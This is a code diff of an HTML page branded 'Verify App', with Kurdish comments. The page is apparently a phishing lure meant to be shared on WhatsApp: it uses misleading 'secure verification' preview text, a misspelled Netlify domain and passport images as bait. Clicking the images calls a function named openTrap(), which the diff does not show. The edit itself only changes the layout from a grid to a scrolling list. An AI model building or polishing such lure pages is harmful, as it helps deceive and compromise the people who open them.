@@ -14,7 +14,7 @@
     <meta property="og:description" content="Unlimited screen recording and secure verification process for your account. Tap to view details.">
     <meta property="og:site_name" content="Verify App">
     
-    <!-- وێنەی یەکەم بۆ پێشبینینی واتساپ بە ڕێژەی 1200x630 -->
+    <!-- وێنەی یەکەم بۆ پێشبینینی واتساپ -->
     <meta property="og:image" content="https://verfy-app.netlify.app/IMG_6579.jpeg">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
@@ -28,30 +28,29 @@
         body, html { 
             margin: 0; 
             padding: 0; 
-            background-color: #000; 
+            background-color: #000; /* ڕەنگی پاشبنەما */
             height: 100%; 
             width: 100%;
-            overflow: hidden; 
+            overflow-y: auto; /* ڕێگە بە سکرۆلکردن دەدات */
+            overflow-x: hidden;
         }
-        .image-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            grid-template-rows: 1fr 1fr;
-            gap: 2px;
-            width: 100vw;
-            height: 100vh;
-        }
-        .image-grid img {
+        .image-list {
+            display: flex;
+            flex-direction: column; /* ڕێکخستنی ستوونی */
             width: 100%;
-            height: 100%;
-            object-fit: cover;
             cursor: pointer;
+        }
+        .image-list img {
+            width: 100%;
+            height: auto;
+            display: block;
+            margin-bottom: 2px; /* بۆشاییەکی زۆر بچووک لە نێوان وێنەکان */
         }
     </style>
 </head>
 <body>
-    <!-- وێنەکان بەپێی ناوەکانی GitHub -->
-    <div class="image-grid" onclick="openTrap()">
+    <!-- وێنەکان بە شێوەی ستوونی یەک لە دوای یەک -->
+    <div class="image-list" onclick="openTrap()">
         <img src="IMG_6579.jpeg" alt="Passport 1">
         <img src="IMG_6580.jpeg" alt="Passport 2">
         <img src="IMG_6581.jpeg" alt="Passport 3">
